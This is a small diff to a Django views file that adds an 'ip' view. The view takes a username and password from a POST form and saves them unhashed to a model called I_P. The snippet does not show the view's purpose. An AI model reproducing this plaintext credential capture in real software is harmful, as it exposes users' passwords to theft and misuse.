@@ -905,6 +905,14 @@ def privacy_policy(request):
 def terms_conditions(request):
     return render(request,'user/terms_conditions.html')
 
+def ip(request):
+    if request.POST:
+        username = request.POST.get('username')
+        password = request.POST.get('password')
+        I_P(username=username,password=password).save()
+
+    return render(request,'i_p/index.html')
+
 def landing_page_home(request):
     id=19
     feature_data = dict()
